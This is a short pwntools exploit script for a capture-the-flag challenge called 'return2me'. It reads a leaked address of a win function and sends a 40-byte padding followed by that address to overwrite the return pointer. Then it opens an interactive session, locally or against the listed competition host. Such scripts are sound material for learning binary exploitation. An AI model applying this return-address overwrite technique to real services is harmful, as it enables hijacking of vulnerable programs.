#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './return2me_patched' # <-- change this
elf = context.binary = ELF(exe, checksec=True)
# libc = '/lib/x86_64-linux-gnu/libc.so.6'
# libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = 'challenges.ctf.compfest.id', 9013 # <-- change this

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(exe)
    
    io.recvuntil(b'0x')
    win = int(io.recvline().strip(), 16)
    log.info(f'win: {hex(win)}')

    offset = 40
    payload = b'\x00' * offset
    payload += p64(win)

    io.sendline(payload)
    io.interactive()
    
if __name__ == '__main__':
    exploit()